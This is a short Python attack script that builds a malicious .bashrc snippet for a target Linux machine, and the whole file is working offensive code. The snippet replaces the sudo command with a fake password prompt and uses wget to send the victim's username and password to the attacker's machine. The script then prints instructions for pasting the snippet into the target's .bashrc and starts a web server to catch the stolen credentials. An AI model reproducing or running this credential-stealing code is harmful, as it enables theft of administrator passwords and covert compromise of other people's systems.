import os
import subprocess as s
import sys

def main():
	#This function creates a script that edits .bashrc
	#on a target box once run on it so that anytime
	#someone uses the 'sudo' command, it sends an http
	#request to a server that is also hosted on the attacking
	#box with the username and password

	#Printing notice
	input("[!] THIS SHOULD BE RUN ON ATTACKING MACHINE(hit enter to continue)")

	#if(len(sys.argv) > 1):
	#	input("test")
	#input("testing")
	#Grabbing ip of attacking box
	ip = s.getoutput("hostname -I")
	print("[*] Hosting web server on: " + str(ip))

	#Create sell script to be put on target box
	print("[*] Output file: .bashhrc")
	if os.path.exists(".bashhrc"):
		os.remove(".bashhrc")
	f = open(".bashhrc", "x")
	
	#Defining function
	f.write('function sudo(){\norigsudo="$(which sudo)";\n')

	#Giving prompt and storing password in pw var
	f.write('read -s -p "[sudo] password for $USER: " pw;printf "\\n";\n')

	#Creating web request
	f.write('wget "')
	f.write(str(ip))
	f.write('/$USER:$pw" > /dev/null 2>&1;\n')

	#Executing original command
	f.write("$origsudo $@;\n")
	
	#Closing function
	f.write("}")
	f.close()

	#Printing user instructions
	print("[!] INSTRUCTIONS:")
	print("[!]\t1. Copy contents of .bashhrc in this directory")
	print("[!]\t2. Paste at end of .bashrc file on TARGET machine")
	print("[!]\t3. Run '. ~/.bashrc'")

	print("[*] Starting Web Server to listen for credentials...")

	#Starting up web server to recieve credentials
	os.system("sudo python3 -m http.server 80 --bind " + ip)


main()
